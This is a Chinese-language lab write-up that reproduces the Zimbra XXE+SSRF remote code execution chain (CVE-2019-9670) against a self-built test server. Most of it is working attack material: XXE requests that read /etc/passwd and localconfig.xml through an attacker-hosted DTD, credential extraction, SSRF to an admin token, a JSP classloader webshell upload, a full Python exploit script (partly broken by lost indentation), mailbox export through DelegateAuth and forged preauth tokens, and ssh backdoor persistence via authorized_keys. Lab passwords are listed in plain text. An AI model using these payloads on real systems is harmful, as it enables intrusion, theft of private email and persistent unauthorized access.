### 搭建zimbra邮件服务器

在这里我们选择使用centos7搭建，具体流程参考下面三个链接即可。

<https://blog.csdn.net/u013618714/article/details/115478116>

[ttps://www.jianshu.com/p/722bc70ff426](https://www.jianshu.com/p/722bc70ff426)

<https://xz.aliyun.com/t/7991#toc-0>

基本信息：

服务器域名
=====

> vvvv1.zimbra.com

管理员账户
=====

> 账户密码：admin@vvvv1.zimbra.com\\123456

成功安装后，ping域名即可得到ip：

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685033991-50421459-2e4a-495f-bbbb-5c5e3dd9422f.png)

在外网访问目标网页，发现无法访问，原因是防火墙没有对外开放对应的端口。

> <https://192.168.52.142>

开启443端口或者关闭防火墙

> iptables -I INPUT -p tcp --dport 443 -j ACCEPT # 开启443端口

关闭防火墙

> systemctl stop firewalld

创建用户

> zmprov createAccount mary@zimbra.com admin123 displayName 'Mary'
> 
> zmprov createAccount tom@zimbra.com admin123 displayName 'Tom'

或者在管理页面创建

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685340297-4460f71e-38ad-4bcd-add6-fbddd03f7eb0.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685391069-17638d91-5719-4d0e-9171-6b2c40086345.png)

> root:6\*fe~%xX4br)R8piK5Y
> 
> vvvv1:R8+)uNIe\_$Z~Jmx6hSE
> 
> admin@vvvv1.zimbra.com:()5h8G@rv8qebcWCWjxH
> 
> zjj@vvvv1.zimbra.com:1a1L+t#L#7Lrh7AO2xi
> 
> xyq@vvvv1.zimbra.com:YJzmSl!o1Nwo%$Ld3npl

### 利用XXE+SSRF组合拳RCE复现

[https://blog.csdn.net/qq\_44700119/article/details/129478006](https://blog.csdn.net/qq_44700119/article/details/129478006)

<https://cn-sec.com/archives/1165703.html>

<http://www.xbhp.cn/news/152117.html>

#### 验证是否存在漏洞

POST请求/Autodiscover/Autodiscover.xml

```php
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 192.168.52.142
Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=true
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 350


<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
      <EMailAddress>aaaaa</EMailAddress>
      <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
  </Autodiscover>
```

验证成功，返回/etc/passwd内容。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685763262-0224fb1d-5ade-4eba-9614-300ba088851e.png)

#### 读取zimbra用户账号密码

XXE漏洞原理：

<http://www.xbhp.cn/news/152117.html>

利用xxe漏洞获取zimbra的关键配置文件内容，目的是从配置文件中获取zimbra的用户名及密码信息。对应的关键配置文件为localconfig.xml。

但是还有一个问题：这个目标文件是一个xml文件，因此不能直接在数据包中替换，(由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取)需要借用外部dtd,构造的外部dtd如下:

```php
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

将该dtd命名为poc.dtd，并且在目标主机能访问到的主机开启http服务，保证在发送数据包的时候可以成功访问到目标文件，使其远程执行该dtd文件。

kali开启http

> python3 -m http.server 7777

发送如下数据包包含远程dtd文件。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689686621520-fd0a68d7-5976-44d8-acc1-edb51dd5b7e5.png)

```php
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 192.168.52.142
Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=true
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 346

  %dtd; %all; ]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">  <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request></Autodiscover>
```

获得密码：3JS3MkuYGG

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689686747642-41d97bf9-de2e-4258-a880-5027438f5f52.png)

获取低权限的token

这里是向客户端登陆处/service/soap发送，也可以向管理员登陆处7071端口/service/admin/soap发送payload直接获取高权限token，注意下改端口以及将&lt;AuthRequest xmlns="urn:zimbraAccount"&gt;改为&lt;AuthRequest xmlns="urn:zimbraAdmin"&gt;即可。

```php
POST /service/soap HTTP/1.1
Host: 192.168.52.142
Content-Length: 469
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="urn:zimbraAccount">
        <account by="adminName">zimbra</account>
        <password>3JS3MkuYGG</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
```

将获取到的低权限token设置到cookie中，探测是否存在ssrf，注意，修改cookie时如果401错误，将cookie字段ZM\_AUTH\_TOKEN改为ZM\_ADMIN\_AUTH\_TOKEN即可

```php
POST /service/proxy?target=https://abcd.0lzme4.dnslog.cn HTTP/1.1
Host: 192.168.8.130:7071
Content-Length: 0
Cookie: ZM_ADMIN_AUTH_TOKEN=0_445fad824269f204515a7c310c0fc7fbfcfc425c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

获取高权限的token

ssrf可利用后，结合低权限token获取一个高权限token，将&lt;AuthRequest xmlns="urn:zimbraAccount"&gt;改为&lt;AuthRequest xmlns="urn:zimbraAdmin"&gt;

```php
POST /service/proxy?target=https://192.168.52.142:7071/service/admin/soap HTTP/1.1
Host: 192.168.52.142:7071
Content-Length: 465
Cookie: ZM_ADMIN_AUTH_TOKEN=0_8461306ed16127d9f1138721e76f49db3b176a4c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313638393930353136373739383b747970653d363a7a696d6272613b7469643d31303a313430363031313230313b;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="urn:zimbraAdmin">
        <account by="adminName">zimbra</account>
        <password>3JS3MkuYGG</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
```

利用获取到的高权限token调用文件上传接口/service/extension/clientUploader/upload，上传webshell

上传一句话木马

```php
密码：passwd
<%!
class U extends ClassLoader {
    U(ClassLoader c) {
        super(c);
    }
    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
}

public byte[] base64Decode(String str) throws Exception {
    try {
        Class clazz = Class.forName("sun.misc.BASE64Decoder");
        return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
    } catch (Exception e) {
        Class clazz = Class.forName("java.util.Base64");
        Object decoder = clazz.getMethod("getDecoder").invoke(null);
        return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
    }
}
%>
<%
String cls = request.getParameter("passwd");
if (cls != null) {
    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
}
    %>
```

```php
POST /service/extension/clientUploader/upload HTTP/1.1
Host: 192.168.52.142:7071
Cookie:ZM_ADMIN_AUTH_TOKEN=0_ac132517416ecf59c8e7f0e221f8efcf055e535b_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313638393639313639383131313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3232333338353538393b;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Accept: */*
Connection: close
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfguo5iLr5MUuhaZ
Content-Length: 2993

------WebKitFormBoundaryyfguo5iLr5MUuhaZ
Content-Disposition: form-data; name="filename1"

qweqwe
------WebKitFormBoundaryyfguo5iLr5MUuhaZ
Content-Disposition: form-data; name="clientFile";filename="shell.jsp"

asf

------WebKitFormBoundaryyfguo5iLr5MUuhaZ
Content-Disposition: form-data; name="requestId"

111111
------WebKitFormBoundaryyfguo5iLr5MUuhaZ--
```

以上的流程可以编写exp

```php
# References: 
# http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce
import requests
import sys
import urllib.parse
import re
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class zimbra_rce(object):
    def __init__(self, base_url, dtd_url, file_name, payload_file):
        self.base_url = base_url
        self.dtd_url = dtd_url
        self.low_auth = {}
        self.file_name = file_name
        self.payload = open(payload_file, "r").read()
        self.pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")

    def upload_dtd_payload(self):
        '''
        Example DTD payload:
            <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % end "]]>">
            <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
        '''
        xxe_payload = r"""
            %dtd;
            %all;
            ]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
                <EMailAddress>aaaaa</EMailAddress>
                <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
            </Request>
        </Autodiscover>""".format(self.dtd_url)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            "Content-Type":"application/xml"
        }
        print("[*] Uploading DTD.", end="\r")
        dtd_request = requests.post(self.base_url+"/Autodiscover/Autodiscover.xml",data=xxe_payload,headers=headers,verify=False,timeout=15)
        # print(r.text)
        if 'response schema not available' not in dtd_request.text:
            print("[-] Site Not Vulnerable To XXE.")
            return False
        else:
            print("[+] Uploaded DTD.")
            print("[*] Attempting to extract User/Pass.", end="\r")
            pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
            if pattern_name.findall(dtd_request.text) and pattern_password.findall(dtd_request.text):
                username = pattern_name.findall(dtd_request.text)[0][2]
                password = pattern_password.findall(dtd_request.text)[0][2]
                self.low_auth = {"username" : username, "password" : password}
                print("[+] Extracted Username: {} Password: {}".format(username, password))
            return True
            print("[-] Unable To extract User/Pass.")
            return False

            def make_xml_auth_body(self, xmlns, username, password):
            auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
            <soap:Header>
            <context xmlns="urn:zimbra">
            <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
            </context>
            </soap:Header>
            <soap:Body>
            <AuthRequest xmlns="{}">
            <account by="adminName">{}</account>
            <password>{}</password>
            </AuthRequest>
            </soap:Body>
            </soap:Envelope>"""
            return auth_body.format(xmlns, username, password)

            def gather_low_auth_token(self):
            print("[*] Getting Low Privilege Auth Token", end="\r")
            headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            "Content-Type":"application/xml"
            }
            r=requests.post(self.base_url+"/service/soap",data=self.make_xml_auth_body(
            "urn:zimbraAccount", 
            self.low_auth["username"], 
            self.low_auth["password"]
            ), headers=headers, verify=False, timeout=15)
            low_priv_token = self.pattern_auth_token.findall(r.text)
            if low_priv_token:
            print("[+] Gathered Low Auth Token.")
            return low_priv_token[0].strip()
            print("[-] Failed to get Low Auth Token")
            return False

            def ssrf_admin_token(self, low_priv_token):
            headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63',
            "Content-Type":"application/xml"
            }
            headers["Host"]="{}:7071".format(urllib.parse.urlparse(self.base_url).netloc.split(":")[0])
            print("[*] Getting Admin Auth Token By SSRF", end="\r")
            r = requests.post(self.base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap/AuthRequest",
            data=self.make_xml_auth_body(
            "urn:zimbraAdmin", 
            self.low_auth["username"], 
            self.low_auth["password"]
            ),
            verify=False, 
            headers=headers,
            cookies={"ZM_ADMIN_AUTH_TOKEN":low_priv_token}
            )
            admin_token = self.pattern_auth_token.findall(r.text)
            if admin_token:
            print("[+] Gathered Admin Auth Token.")
            return admin_token[0].strip()
            print("[-] Failed to get Admin Auth Token")
            return False

            def upload_payload(self, admin_token):
            f = {
            'filename1':(None, "whatszimbra", None),
            'clientFile':(self.file_name, self.payload, "text/plain"),
            'requestId':(None, "12356721-3268-3782", None),
            }
            cookies = {
            "ZM_ADMIN_AUTH_TOKEN":admin_token
            }
            print("[*] Uploading file", end="\r")
            r = requests.post(self.base_url+"/service/extension/clientUploader/upload",files=f,
            cookies=cookies, 
            verify=False
            )
            if r.status_code == 200:
            r = requests.get(self.base_url + "/downloads/" + self.file_name,
            cookies=cookies, 
            verify=False
            )
            if r.status_code != 404: # some jsp shells throw a 500 if invalid parameters are given
            print("[+] Uploaded file to: {}/downloads/{}".format(self.base_url, self.file_name))
            print("[+] You may need the need cookie: \n{}={};".format("ZM_ADMIN_AUTH_TOKEN", cookies["ZM_ADMIN_AUTH_TOKEN"]))
            return True
            print("[-] Cannot Upload File.")
            return False

            def exploit(self):
            try:
            if self.upload_dtd_payload():
            low_auth_token = self.gather_low_auth_token()
            if low_auth_token:
            admin_auth_token = self.ssrf_admin_token(low_auth_token)
            if admin_auth_token:
            return self.upload_payload(admin_auth_token)
            except Exception as e:
            print("Error: {}".format(e))
            return False

            if __name__ == "__main__":
            parser = argparse.ArgumentParser(description='Zimbra RCE CVE-2019-9670')
            parser.add_argument('-u', '--url', action='store', dest='url',
            help='Target url', required=True)
            parser.add_argument('-d', '--dtd', action='store', dest='dtd',
            help='Url to DTD', required=True)
            parser.add_argument('-n', '--name', action='store', dest='payload_name',
            help='Name of uploaded payload', required=True)
            parser.add_argument('-f', '--file', action='store', dest='payload_file',
            help='File containing payload', required=True)
            results = parser.parse_args()
            z = zimbra_rce(results.url, results.dtd, results.payload_name, results.payload_file)
            z.exploit()
```

#### 总结

**这一个漏洞主要分为三部来进行利用：**

1.利用XXE漏洞获取到zimbra账号和密码；

2.利用ssrf和zimbra接口调用获取到高权限token；

3.利用高权限token上传webshell进行连接；

通过XXE漏洞读取zimbra账号密码，而zimbra账号是无法进行登录的，但是拥有很高的权限，可以使用该用户的token来调用管理员的api接口。

实际上，只要拥有管理员级别的高权限token，就可以调用接口DelegateAuth来获取其他用户的token，获取到其他用户的token就可以直接登录web网站导出对应的邮件。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689910727993-4298676b-6e13-4a57-ac89-910d9f3421a7.png)

请求包构造：

> {token}：已经持有的高权限token
> 
> {mail}：需要获得的token的用户邮箱名称

```php
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <context xmlns="urn:zimbra">
      <authToken>{token}</authToken>
    </context>
  </soap:Header>
  <soap:Body>
    <DelegateAuthRequest xmlns="urn:zimbraAdmin">
      <account by="name">{mail}</account>        
    </DelegateAuthRequest>
  </soap:Body>
</soap:Envelope>
```

**对于使用ssrf的思考：**

如果在XXE漏洞存在的情况下，我们已经获取到了zimbra用户的账号密码，那么就可以使用访问/service/soap将zimbra用户的账号密码转化成低权限token，用来访问443端口的网页。

```php
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">              
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
```

但是，如果我们想要获得其他用户的token，就需要访问到7071的管理员页面，假如7071的可以访问的情况下，我们就可以直接调用接口DelegateAuth获取其他用户的token，但是如果目标机器防火墙并未开放7071管理员页面，那么就无法直接访问/service/admin/soap，那么就必须要使用ssrf漏洞了，通过内部访问7071端口，从内部获取其他用户的token，访问/service/proxy?target=[https://127.0.0.1:7071/service/admin/soap即可绕过防火墙限制](https://127.0.0.1:7071/service/admin/soap%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6)。

### 导出任意用户邮件

#### 方式一

通过获取到zimbra账户密码，利用zimbra账户密码转换成token，去获取其他用户的token，然后可以通过其他用户的token去登录其他用户的邮箱，来导出邮件。

利用脚本：

[https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra\_SOAP\_API\_Manage.py](https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py)

接口利用：

[https://files.zimbra.com/docs/soap\_api/8.6.0/api-reference/index.html](https://files.zimbra.com/docs/soap_api/8.6.0/api-reference/index.html)

<https://3gstudent.github.io/Zimbra-SOAP-API%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97>

**从web网页导出邮件的方法**

获取到用户token后，我们可以在浏览器中导入token，刷新页面就可以进入到网页之中了。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689920639144-99d37019-e392-4f30-ac3f-23118e9361f3.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689920721824-e7aa2eaf-bed0-472c-8261-0c25fd26901d.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689920741668-13d2b8a8-a6ad-44f9-9590-4cdac9474a50.png)

点击首选项-&gt;导入/导出处即可导出用户邮件。

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689920856894-f72b0f7d-24fa-41e7-b636-3ea15d562176.png)

当然，也可以通过调用接口来实现。

这个方法适用于获取了zimbra用户的账号以及token，然后获取了其他用户token的。

如何获取其他用户token的方法已经在上文进行介绍了，这里主要介绍导出邮件的接口利用。

只需要一个GET请求即可：

```php
def exportmailall_request(uri,token,mailbox):

    from time import localtime, strftime
    exporttime = strftime("%Y-%m-%d-%H%M%S", localtime())
    filename = "All-" + str(exporttime)

    url = uri + "/home/" + mailbox + "/?fmt=tgz&filename=" + filename + "&emptyname=No+Data+to+Export&charset=UTF-8&callback=ZmImportExportController.exportErrorCallback__export1"
    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"
    r = requests.get(url,headers=headers,verify=False)

    if r.status_code == 200:        
        print("[*] Try to export the mail")
        path = filename + ".tgz"        
        with open(path, 'wb+') as file_object:
            file_object.write(r.content)
        print("[+] Save as " + path)
    else:
        print("[!]")
        print(r.status_code)
        print(r.text)
```

#### 方式二

方式一主要依赖zimbra账号的token，如果目标修改了zimbra账号密码的话，就无法继续导出邮件。

方式二不依赖zimbra账号，在我们获取了webshell或者有机会以zimbra或者管理员身份执行命令的适合即可使用方式二，而且即使后期对方修改了zimbra账号密码也不影响我们导出其他用户的token。

<https://3gstudent.github.io/Zimbra-SOAP-API%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-%E9%A2%84%E8%AE%A4%E8%AF%81>

<https://wiki.zimbra.com/wiki/Preauth>

预认证攻击：

通过preAuthKey结合用户名、计时器和定时器时间，计算得出的HMAC身份验证的令牌，可用于用户邮箱和SOAP登录。

首先需要生成preAuthKey

搜索zmprov命令地址

> find /opt/ -name zmprov

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689756667623-f7422997-8af5-4342-99ba-1b76faec398f.png)

> zmrov generateDomainPreAuthKey &lt;domain&gt;
> 
> zmprov generateDomainPreAuthKey vvvv1.zimbra.com

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689748774825-b6475818-ee4f-49bf-b9b6-e88d6afc62ea.png)

读取已有的PreAuthKey

/opt/zimbra/bin/zmprov gd &lt;domain&gt; zimbraPreAuthKey

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689921763702-096ef985-2489-46ba-99a2-a15b73098dff.png)

preAuthKey: cd5df57188a43ed393c4001786a864e3752e21a759383072d02980057637aca2

利用这个key，就可以生成其他用户的token了

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689922202493-489ade9f-416e-4b4b-9c6b-832ab8fa287a.png)

```php
def generate_preauth(target, mailbox, preauth_key):
    try:
        preauth_url = target + "/service/preauth"
        timestamp = int(time()*1000)
        data = "{mailbox}|name|0|{timestamp}".format(mailbox=mailbox, timestamp=timestamp)
        pak = hmac.new(preauth_key.encode(), data.encode(), hashlib.sha1).hexdigest()
        print("[+] Preauth url: ")   
        print("%s?account=%s&expires=0&timestamp=%s&preauth=%s"%(preauth_url, mailbox, timestamp, pak))
        return timestamp, pak
    except Exception as e:
        print("[!] Error:%s"%(e))
```

生成过程：

1.提供URL接口的地方是 /service/preauth? 而这个接口需要接收四个参数分别是

> account={account-identifier}
> 
> \# 这里就是填用户的邮箱地址
> 
> by={by-value}
> 
> \# 这个一般是设置属性，一般默认的是name
> 
> timestamp={time}
> 
> \# 当前时间的时间戳 要在服务器的时间的5分钟内
> 
> expires={expires}
> 
> \# 设置token过期时间，一般设置0是选着默认的过期时间
> 
> \[&amp;admin=1\]
> 
> \# 这个参数是在请求管理员的预登录才有，并且是请求来自管理端口(https 7071)
> 
> preauth={computed-preauth}
> 
> # 这个参数需要依靠上面的值进行计算

2.计算preauth参数的值

将accoun，by，expires，timestamp按照顺序用|连接

> accoun|by|expires|timestamp
> 
> john.doe@domain.com|name|0|1135280708088

3.然后使用SHA-1 HMAC计算

> preauth = hmac("john.doe@domain.com|name|0|1135280708088",
> 
> "6b7ead4bd425836e8cf0079cd6c1a05acc127acd07c8ee4b61023e19250e929c");
> 
> preauth-value: b248f6cfd027edd45c5369f8490125204772f844

4.最后拼接为url，去请求接口即可

> /service/preauth?
> 
> account=john.doe@domain.com&amp;expires=0×tamp=1135280708088&amp;preauth=b248f6cfd027edd45c5369f8490125204772f844

代码会自动生成可用的URL，浏览器访问可以登录指定邮箱。

当然，我们也可以生成token来进行使用。

调用接口/service/soap，通过mail、timestamp、pak来生成对应用户的token。

```php
def auth_request_preauth(uri,username,timestamp,pak):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">              
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account>{username}</account>
            <preauth timestamp="{timestamp}" expires="0">{pak}</preauth>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(username=username,timestamp=timestamp,pak=pak),verify=False,timeout=15)
        if 'authentication failed' in r.text:
            print("[-] Authentication failed for %s"%(username))
            exit(0)
        elif 'authToken' in r.text:
            pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_auth_token.findall(r.text)[0]
            print("[+] Authentication success for %s"%(username))
            print("[*] authToken_low:%s"%(token))
            return token
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0) 
```

生成token后就可以导出邮件了，导出邮件的方法也和上面的方法相同，这里就不过多进行叙述了。

### 使用公钥免密登录ssh

**为什么可以免密登陆呢？**

可以理解为公钥就是一把锁，私钥就是钥匙，如果我们无法登陆对方的机器，将我们的公钥写入对方机器，那么就相当于将对方的锁更换，这样就可以使用我们的钥匙连接。当然，也可以将对方的私钥写入我们的机器，就相当于拿到对方的锁的钥匙，也可以直接连接。

<https://www.freebuf.com/sectool/269922.html>

当我们获取到了对方root权限，或者拥有对~/.ssh/文件夹的写入权限，那么就可以通过上传自己的公钥，通过保存在本地是私钥与公钥进行认证，达到免密登录。

当然，如果我们没有root权限的话，获取到哪一个用户的权限，就直接在哪个用户目录下的.ssh目录下写入公钥即可。

转到当前用户的HOME目录

> cd ~

打印出当前用户的HOME目录路径

> echo $HOME

如果HOME目录下没有.ssh文件的话，使用命令创建.ssh文件

> ssh localhost

如果对方.ssh文件已经存在authorized\_keys文件，那么只能将密钥追加到末尾。

**echo '**ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9Z8d1+ylGbT7AM4IrFYpkhWuCljCtOJ/Mv5bWUiwJHj3oUKZLm2jANlLuBFW1OQ94CPvzAkvnvHx2CXahTIXqiZ4Jb1sdw/FfpYZXTgyBKZ6prKIHBu6oQF+AAHtYjq8Gs2OQvWfXm6eITfO1IknIQN1zRwRZFBGX2SzGZxpKOdHze1Pe6uEwXf9XK4aCpBlCaeEqmtfN3ImDVXEYxWgbp3cKWeZC2FZ2JgvqcfAL2FVJ4BGX7iRSY6l/ETUXlKiVN3ygveLE/pMe4wunBwkQlwqeY+TO7kO7WLuGuzOaPBJk8YmnpbZn/ha3os308xBDdFGwW4eROYZWg60kZAPUeuWotmhFajFvmE1VfXAj8FUyA5yxe4lstmOwq5/zppDSdOvt/7EEGdeb/7KyBjG+9OH/5aOIXnUg6UZC+0XxzoLFVKuJO++JeISDbt1PiOZQQquo6VxCZIJ2ZvaMCoZiA0/ptnJwEOdILP8cu5PkY8FPkx7Jzz6dlPw0kWew/ts= root@kali2023-1**' &gt;&gt; authorized\_keys**

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689946731275-88b6eaec-b951-4e66-bc29-aa4cb9e2d94a.png)

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689933682043-7c1a8669-507a-408d-9881-2ecb623a9810.png)

免密登录原理

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689933721772-6930e7ad-4523-44c8-ad51-a11e48e8df4d.png)

> ssh-keygen -t rsa //生成公钥

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689906293200-313253c2-e4c4-4d01-9563-850fd2a55d30.png)

id\_rsa就是生成的私钥，而id\_rsa.pub就是生成的公钥

注意这里要将公钥id\_rsa.pub改名为authorized\_keys上传至目标服务器的/.ssh文件夹下。并且./ssh 下的文件必须chmod -R 600 .ssh/ 否则权限不够。

**修改StrictModes属性（可以选择设置）**

默认StrictModes属性是 yes，需要修改成 no。

文件地址：/etc/ssh/sshd\_config

**启用AuthorizedKeysFile配置（可以选择设置）**

配置项AuthorizedKeysFile默认是注释的，需要取消注释。

文件地址：/etc/ssh/sshd\_config

**重启ssh（一定要）**

> service sshd restart

![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689906488044-ee81fa5b-c5a1-4c98-948a-d73d77da85c6.png)

然后直接使用ssh连接即可。

